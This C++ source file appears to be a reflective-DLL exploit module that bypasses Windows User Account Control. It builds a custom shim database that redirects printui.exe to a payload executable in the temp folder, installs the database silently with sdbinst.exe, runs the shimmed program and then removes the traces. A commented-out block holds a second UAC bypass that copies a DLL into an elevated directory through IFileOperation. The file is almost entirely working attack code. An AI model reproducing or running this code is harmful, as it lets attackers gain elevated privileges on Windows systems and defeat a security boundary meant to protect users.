#include "ReflectiveLoader.h"
#include "Exploit.h"
#include "apphlp.h"  

#define SAFERELEASE(x) if(NULL != x){x->Release(); x = NULL;}

extern "C" {

	BOOL LoadAppHelpFunctions(HMODULE hAppHelp, PAPPHELP_API pAppHelp) {
		if (!(pAppHelp->SdbBeginWriteListTag =
			(SdbBeginWriteListTagPtr)GetProcAddress(hAppHelp, "SdbBeginWriteListTag")))
			return FALSE;
		if (!(pAppHelp->SdbCloseDatabase =
			(SdbCloseDatabasePtr)GetProcAddress(hAppHelp, "SdbCloseDatabase")))
			return FALSE;
		if (!(pAppHelp->SdbCloseDatabaseWrite =
			(SdbCloseDatabaseWritePtr)GetProcAddress(hAppHelp, "SdbCloseDatabaseWrite")))
			return FALSE;
		if (!(pAppHelp->SdbCommitIndexes =
			(SdbCommitIndexesPtr)GetProcAddress(hAppHelp, "SdbCommitIndexes")))
			return FALSE;
		if (!(pAppHelp->SdbCreateDatabase =
			(SdbCreateDatabasePtr)GetProcAddress(hAppHelp, "SdbCreateDatabase")))
			return FALSE;
		if (!(pAppHelp->SdbDeclareIndex =
			(SdbDeclareIndexPtr)GetProcAddress(hAppHelp, "SdbDeclareIndex")))
			return FALSE;
		if (!(pAppHelp->SdbEndWriteListTag =
			(SdbEndWriteListTagPtr)GetProcAddress(hAppHelp, "SdbEndWriteListTag")))
			return FALSE;
		if (!(pAppHelp->SdbStartIndexing =
			(SdbStartIndexingPtr)GetProcAddress(hAppHelp, "SdbStartIndexing")))
			return FALSE;
		if (!(pAppHelp->SdbStopIndexing =
			(SdbStopIndexingPtr)GetProcAddress(hAppHelp, "SdbStopIndexing")))
			return FALSE;
		if (!(pAppHelp->SdbWriteBinaryTag =
			(SdbWriteBinaryTagPtr)GetProcAddress(hAppHelp, "SdbWriteBinaryTag")))
			return FALSE;
		if (!(pAppHelp->SdbWriteDWORDTag =
			(SdbWriteDWORDTagPtr)GetProcAddress(hAppHelp, "SdbWriteDWORDTag")))
			return FALSE;
		if (!(pAppHelp->SdbWriteQWORDTag =
			(SdbWriteQWORDTagPtr)GetProcAddress(hAppHelp, "SdbWriteQWORDTag")))
			return FALSE;
		if (!(pAppHelp->SdbWriteStringTag =
			(SdbWriteStringTagPtr)GetProcAddress(hAppHelp, "SdbWriteStringTag")))
			return FALSE;

		return TRUE;
	}

	VOID exploit(BypassUacPaths const * const paths)
	{
		/*
		dprintf("[BYPASSUACINJ] szElevDir          = %S", paths->szElevDir);
		dprintf("[BYPASSUACINJ] szElevDirSysWow64  = %S", paths->szElevDirSysWow64);
		dprintf("[BYPASSUACINJ] szElevDll          = %S", paths->szElevDll);
		dprintf("[BYPASSUACINJ] szElevDllFull      = %S", paths->szElevDllFull);
		dprintf("[BYPASSUACINJ] szElevExeFull      = %S", paths->szElevExeFull);
		dprintf("[BYPASSUACINJ] szDllTempPath      = %S", paths->szDllTempPath);*/

		WCHAR wszSDBTempPath[MAX_PATH + 1] = { 0 };
		WCHAR wszUninstall[MAX_PATH + 1] = { 0 };
		WCHAR wszPayloadTempPath[MAX_PATH + 1] = { 0 };
		WCHAR wszShExecVerb[MAX_PATH + 1] = L"open";
		WCHAR wszShAppHelpDLL[MAX_PATH + 1] = L"apphelp.dll";
		WCHAR wszShimDBName[MAX_PATH + 1] = L"badsdb";
		WCHAR wszShimDBFileName[MAX_PATH + 1] = L"\\mydb.sdb";
		WCHAR wszShimDBVersion[MAX_PATH + 1] = L"2.1.0.3";
		WCHAR wszShimInstaller[MAX_PATH + 1] = L"sdbinst.exe";

		WCHAR wszPayloadFileName[MAX_PATH + 1] = L"\\CRYPTBASE.EXE";
		WCHAR wszShimmedExe[MAX_PATH + 1] = L"printui.exe";
		WCHAR wszShimmedExeFileName[MAX_PATH + 1] = L"printui32.exe";
		WCHAR wszShimVendor[MAX_PATH + 1] = L"Aczire Solutions";
		WCHAR wszShimType[MAX_PATH + 1] = L"RedirectEXE";

		HMODULE hAppHelp = LoadLibraryW(wszShAppHelpDLL);
		APPHELP_API api = { 0 };
		INDEXID idx1, idx2, idx3, idx4, idx5, idx6, idx7, idx8, idx9;
		TAGID tId1, tId2, tId3, tId4, tId5;
		PDB db = NULL;
		BYTE binBuff[] = { 0x14, 0x7d, 0xe1, 0xd1, 0xbc, 0xca, 0x6f,
			0x4f, 0x9f, 0x46, 0xc7, 0xec, 0xf8, 0x13, 0x64, 0x5e };
		BYTE binBuff2[] = { 0x13, 0x08, 0x37, 0x3a, 0x49, 0x21, 0x7d,
			0x40, 0xb2, 0xcd, 0xee, 0x83, 0xdd, 0x35, 0x3d, 0x83 };

		SHELLEXECUTEINFOW ShExec = { 0 };
		ShExec.cbSize = sizeof(SHELLEXECUTEINFOW);
		ShExec.fMask = SEE_MASK_NOCLOSEPROCESS;
		ShExec.hwnd = NULL;
		ShExec.lpVerb = wszShExecVerb;
		ShExec.lpDirectory = NULL;
		ShExec.hInstApp = NULL;

		if (!LoadAppHelpFunctions(hAppHelp, &api)) {
			dprintf("[-]Failed to load apphelp api!\n");
			return;
		}

		GetTempPathW(MAX_PATH, wszSDBTempPath);
		wcscat_s(wszSDBTempPath, MAX_PATH, wszShimDBFileName);

		GetTempPathW(MAX_PATH, wszPayloadTempPath);
		wcscat_s(wszPayloadTempPath, MAX_PATH, wszPayloadFileName);

		db = api.SdbCreateDatabase(wszSDBTempPath, DOS_PATH);
		api.SdbDeclareIndex(db, TAG_TYPE_LIST, 24577, 1, TRUE, &idx1);
		api.SdbDeclareIndex(db, TAG_TYPE_LIST, 24587, 0, FALSE, &idx2);
		api.SdbDeclareIndex(db, TAG_TYPE_LIST, 24608, 0, FALSE, &idx3);
		api.SdbDeclareIndex(db, 28676, 24577, 0, FALSE, &idx4);
		api.SdbDeclareIndex(db, 28685, 16405, 0, FALSE, &idx5);
		api.SdbDeclareIndex(db, 28688, 24577, 0, TRUE, &idx6);
		api.SdbDeclareIndex(db, 28690, 36870, 0, FALSE, &idx7);
		api.SdbDeclareIndex(db, 28690, 36868, 0, TRUE, &idx8);
		api.SdbDeclareIndex(db, TAG_TYPE_LIST, 36868, 1, FALSE, &idx9);
		api.SdbCommitIndexes(db);
		tId1 = api.SdbBeginWriteListTag(db, 28673);
		api.SdbWriteQWORDTag(db, 20481, 2900865542);
		api.SdbWriteStringTag(db, 24610, wszShimDBVersion); // Version  
		api.SdbWriteStringTag(db, 24577, wszShimDBName); // Custom shim database info  
		api.SdbWriteDWORDTag(db, 16419, 1);
		api.SdbWriteBinaryTag(db, 36871, binBuff, 16);
		tId2 = api.SdbBeginWriteListTag(db, 28674);
		api.SdbStartIndexing(db, idx4);
		api.SdbStopIndexing(db, idx4);
		api.SdbStartIndexing(db, idx6);
		api.SdbStopIndexing(db, idx6);
		api.SdbEndWriteListTag(db, tId2);
		api.SdbStartIndexing(db, idx2);
		api.SdbStopIndexing(db, idx2);
		api.SdbStartIndexing(db, idx3);
		api.SdbStopIndexing(db, idx3);
		api.SdbStartIndexing(db, idx1);
		api.SdbStartIndexing(db, idx9);
		tId3 = api.SdbBeginWriteListTag(db, 28679);
		api.SdbWriteStringTag(db, 24577, wszShimmedExe); // Executable to be shimmed  
		api.SdbWriteStringTag(db, 24582, wszShimmedExeFileName); // Shim name  
		api.SdbWriteStringTag(db, 24581, wszShimVendor); // Vendor  
		api.SdbWriteBinaryTag(db, 36868, binBuff2, 16);
		tId4 = api.SdbBeginWriteListTag(db, 28680);
		api.SdbWriteStringTag(db, 24577, L"*");
		api.SdbEndWriteListTag(db, tId4);
		tId5 = api.SdbBeginWriteListTag(db, 28681);
		api.SdbWriteStringTag(db, 24577, wszShimType); // Fix type  
		api.SdbWriteStringTag(db, 24584, wszPayloadTempPath); // Executable to redirect to  
		api.SdbEndWriteListTag(db, tId5);
		api.SdbEndWriteListTag(db, tId3);
		api.SdbStopIndexing(db, idx9);
		api.SdbStopIndexing(db, idx1);
		api.SdbStartIndexing(db, idx7);
		api.SdbStartIndexing(db, idx8);
		api.SdbStopIndexing(db, idx8);
		api.SdbStopIndexing(db, idx7);
		api.SdbStartIndexing(db, idx5);
		api.SdbStopIndexing(db, idx5);
		api.SdbEndWriteListTag(db, tId1);
		api.SdbCloseDatabaseWrite(db);

		ShExec.lpFile = wszShimInstaller;
		ShExec.lpParameters = wszSDBTempPath;
		ShExec.nShow = SW_HIDE;
		if (!ShellExecuteExW(&ShExec)) {
			dprintf("[-]Failed to execute sdbinst.exe!\n");
			DeleteFileW(wszSDBTempPath);
			return;
		}

		WaitForSingleObject(ShExec.hProcess, INFINITE);
		ShExec.lpFile = wszShimmedExe;
		ShExec.lpParameters = NULL;
		ShExec.nShow = SW_SHOWNORMAL;
		if (!ShellExecuteExW(&ShExec)) {
			dprintf("[-]Failed to execute shimmed printui.exe!\n");
			DeleteFileW(wszSDBTempPath);
			return;
		}

		WaitForSingleObject(ShExec.hProcess, INFINITE);
		wcscpy_s(wszUninstall, MAX_PATH, L"-u ");
		wcscat_s(wszUninstall, MAX_PATH, wszSDBTempPath);
		ShExec.lpFile = wszShimInstaller;
		ShExec.lpParameters = wszUninstall;
		ShExec.nShow = SW_HIDE;
		if (!ShellExecuteExW(&ShExec)) {
			dprintf("[-]Failed to uninstall custom shim database!\n");
			DeleteFileW(wszSDBTempPath);
			return;
		}

		WaitForSingleObject(ShExec.hProcess, INFINITE);

		DeleteFileW(wszSDBTempPath);

		/*const wchar_t *szElevArgs = L"";
		const wchar_t *szEIFOMoniker = NULL;

		PVOID OldValue = NULL;

		IFileOperation *pFileOp = NULL;
		IShellItem *pSHISource = 0;
		IShellItem *pSHIDestination = 0;
		IShellItem *pSHIDelete = 0;

		BOOL bComInitialised = FALSE;

		const IID *pIID_EIFO = &__uuidof(IFileOperation);
		const IID *pIID_EIFOClass = &__uuidof(FileOperation);
		const IID *pIID_ShellItem2 = &__uuidof(IShellItem2);

		dprintf("[BYPASSUACINJ] szElevDir          = %S", paths->szElevDir);
		dprintf("[BYPASSUACINJ] szElevDirSysWow64  = %S", paths->szElevDirSysWow64);
		dprintf("[BYPASSUACINJ] szElevDll          = %S", paths->szElevDll);
		dprintf("[BYPASSUACINJ] szElevDllFull      = %S", paths->szElevDllFull);
		dprintf("[BYPASSUACINJ] szElevExeFull      = %S", paths->szElevExeFull);
		dprintf("[BYPASSUACINJ] szDllTempPath      = %S", paths->szDllTempPath);

		do
		{
			if (CoInitialize(NULL) != S_OK)
			{
				dprintf("[BYPASSUACINJ] Failed to initialize COM");
				break;
			}

			bComInitialised = TRUE;

			if (CoCreateInstance(*pIID_EIFOClass, NULL, CLSCTX_LOCAL_SERVER | CLSCTX_INPROC_SERVER | CLSCTX_INPROC_HANDLER, *pIID_EIFO, (void**)&pFileOp) != S_OK)
			{
				dprintf("[BYPASSUACINJ] Couldn't create EIFO instance");
				break;
			}

			if (pFileOp->SetOperationFlags(FOF_NOCONFIRMATION | FOF_NOERRORUI | FOF_SILENT | FOFX_SHOWELEVATIONPROMPT | FOFX_NOCOPYHOOKS | FOFX_REQUIREELEVATION) != S_OK)
			{
				dprintf("[BYPASSUACINJ] Couldn't Set operating flags on file op.");
				break;
			}

			if (SHCreateItemFromParsingName((PCWSTR)paths->szDllTempPath, NULL, *pIID_ShellItem2, (void**)&pSHISource) != S_OK)
			{
				dprintf("[BYPASSUACINJ] Unable to create item from name (source)");
				break;
			}

			if (SHCreateItemFromParsingName(paths->szElevDir, NULL, *pIID_ShellItem2, (void**)&pSHIDestination) != S_OK)
			{
				dprintf("[BYPASSUACINJ] Unable to create item from name (destination)");
				break;
			}

			if (pFileOp->CopyItem(pSHISource, pSHIDestination, paths->szElevDll, NULL) != S_OK)
			{
				dprintf("[BYPASSUACINJ] Unable to prepare copy op for elev dll");
				break;
			}

			//* Copy the DLL file to the target folder
			if (pFileOp->PerformOperations() != S_OK)
			{
				dprintf("[BYPASSUACINJ] Unable to copy elev dll");
				break;
			}

			//* Execute the target binary
			SHELLEXECUTEINFOW shinfo;
			ZeroMemory(&shinfo, sizeof(shinfo));
			shinfo.cbSize = sizeof(shinfo);
			shinfo.fMask = SEE_MASK_NOCLOSEPROCESS;
			shinfo.lpFile = paths->szElevExeFull;
			shinfo.lpParameters = szElevArgs;
			shinfo.lpDirectory = paths->szElevDir;
			shinfo.nShow = SW_HIDE;

			Wow64DisableWow64FsRedirection(&OldValue);
			if (ShellExecuteExW(&shinfo) && shinfo.hProcess != NULL)
			{
				WaitForSingleObject(shinfo.hProcess, 10000);
				CloseHandle(shinfo.hProcess);
			}

			if (S_OK != SHCreateItemFromParsingName(paths->szElevDllFull, NULL, *pIID_ShellItem2, (void**)&pSHIDelete)
				|| NULL == pSHIDelete)
			{
				dprintf("[BYPASSUACINJ] Failed to create item from parsing name (delete)");
				break;
			}

			if (S_OK != pFileOp->DeleteItem(pSHIDelete, NULL))
			{
				dprintf("[BYPASSUACINJ] Failed to prepare op for delete");
				break;
			}

			if (pFileOp->PerformOperations() == S_OK)
			{
				dprintf("[BYPASSUACINJ] Successfully deleted dll");

				// bail out this point because we don't need to keep trying to delete
				break;
			}

			SAFERELEASE(pSHIDelete);

			// If we fail to delete the file probably SYSWOW64 process so use SYSNATIVE to get the correct path
			// DisableWOW64Redirect fails at this? Possibly due to how it interacts with UAC see:
			// http://msdn.microsoft.com/en-us/library/windows/desktop/aa384187(v=vs.85).aspx
			if (S_OK != SHCreateItemFromParsingName(paths->szElevDirSysWow64, NULL, *pIID_ShellItem2, (void**)&pSHIDelete)
				|| NULL == pSHIDelete)
			{
				dprintf("[BYPASSUACINJ] Failed to create item from parsing name for delete (shellitem2)");
				break;
			}

			if (S_OK != pFileOp->DeleteItem(pSHIDelete, NULL))
			{
				dprintf("[BYPASSUACINJ] Failed to prepare op for delete (shellitem2)");
				break;
			}

			if (pFileOp->PerformOperations() == S_OK)
			{
				dprintf("[BYPASSUACINJ] Successfully deleted DLL in target directory from SYSWOW64 process");
			}
			else
			{
				dprintf("[BYPASSUACINJ] Failed to delete target DLL");
			}

		} while (0);

		SAFERELEASE(pSHIDelete);
		SAFERELEASE(pSHIDestination);
		SAFERELEASE(pSHISource);
		SAFERELEASE(pFileOp);

		if (bComInitialised)
		{
			CoUninitialize();
		}*/
	}

}